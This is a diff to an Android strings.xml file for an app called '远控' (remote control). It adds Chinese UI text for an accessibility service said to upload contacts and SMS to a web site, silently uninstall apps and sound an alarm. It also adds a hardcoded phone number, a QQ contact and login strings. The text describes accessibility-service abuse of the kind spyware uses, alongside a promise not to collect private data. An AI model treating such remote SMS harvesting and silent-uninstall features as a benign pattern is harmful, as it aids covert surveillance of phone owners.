@@ -1,4 +1,41 @@
 <resources>
     <string name="app_name">远控</string>
     <string name="no_permission">没有权限</string>
+
+    <string name="accessibility_service_description">
+        打开【远控系统辅助】,可确保远控【同步通讯录】、【同步短信】、【清除手机应用账户信息】和【闹铃】功能的顺畅运行。
+        \n
+        \n【同步通讯录】可以将手机的通讯录同步到云端，必要时导入新手机。避免手机丢失后无法找回联系人信息。
+        \n
+        \n【同步短信】可以将短信内容同步到云端。可登录远控web端 www.cugyk.top查看。
+        \n
+        \n【清除手机应用账户信息】在手机丢失后，可以批量静默卸载卸载手机应用，防止手机上应用后台运行带来损失。
+        \n
+        \n【闹铃】可以手机丢失后，让手机发出警报。
+        \n
+        \n打开服务时，系统会弹出通知，请点击【确定】。
+        \n
+        \n为保证以上功能正常使用，请将远控放入清理工具白名单中。
+        \n以上功能无需Root权限，支持Android4.1以上系统。远控承诺不会通过本功能手机任何隐私信息。
+        如有问题，请联系我们:1260413122@qq.com或QQ:1260413122。
+    </string>
+    <string name="acc_service_name">远控系统辅助</string>
+    <string name="phonenumber">13006397107</string>
+
+    <item name="holder_o" type="id"></item>
+    <item name="holder_t" type="id"></item>
+    <string name="title_activity_login">Sign in</string>
+
+    <!-- Strings related to login -->
+    <string name="prompt_email">Email</string>
+    <string name="prompt_password">Password (optional)</string>
+    <string name="action_sign_in">Sign in or register</string>
+    <string name="action_sign_in_short">Sign in</string>
+    <string name="error_invalid_email">This email address is invalid</string>
+    <string name="error_invalid_password">This password is too short</string>
+    <string name="error_incorrect_password">This password is incorrect</string>
+    <string name="error_field_required">This field is required</string>
+    <string name="permission_rationale">"Contacts permissions are needed for providing email
+        completions."
+    </string>
 </resources>
